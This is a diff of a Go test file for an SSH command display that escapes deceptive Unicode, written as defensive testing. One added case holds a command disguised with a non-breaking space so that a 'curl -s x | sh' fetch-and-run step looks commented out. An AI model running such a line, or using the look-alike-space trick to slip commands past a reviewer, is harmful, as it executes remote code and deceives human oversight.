@@ -61,7 +61,9 @@ func TestSSHRequestRefused(t *testing.T) {
 // for an interactive run (docs/07 D1, D13).
 func TestSSHRequestLoginShell(t *testing.T) {
 	r := build(t, nil, nil, true)
-	if r.Command() != "" || r.DisplayCommand() != "(login shell)" || !r.Interactive() {
+	// Round 1, finding 3: "" here, so the prompt marks a login shell outside
+	// the command block, where no command text can produce it.
+	if r.Command() != "" || r.DisplayCommand() != "" || !r.Interactive() {
 		t.Fatalf("%q %q", r.Command(), r.DisplayCommand())
 	}
 }
@@ -78,6 +80,12 @@ func TestSSHDisplayHostile(t *testing.T) {
 		"echo \U000E0041tag":                         `echo \u{e0041}tag`,
 		"echo e\u0301\u0301\u0301\u0301\u0301\u0301": "echo e\u0301\u0301\u0301\u0301" + `\u{301}\u{301}`,
 		"echo \u3164x":                               `echo \u{3164}x`,
+		// Round 1, finding 1: the shell splits words only on ASCII
+		// blanks, so a space that only looks like one must not pass as
+		// one: "notes<NBSP>#" is one word, and # starts no comment.
+		"cat notes\u00a0# ; curl -s x | sh":  `cat notes\u{a0}# ; curl -s x | sh`,
+		"echo a\u2003b\u202fc\u205fd\u3000e": `echo a\u{2003}b\u{202f}c\u{205f}d\u{3000}e`,
+		"echo a\u1680b":                      `echo a\u{1680}b`,
 	}
 	for in, want := range cases {
 		r := build(t, []string{in}, nil, false)
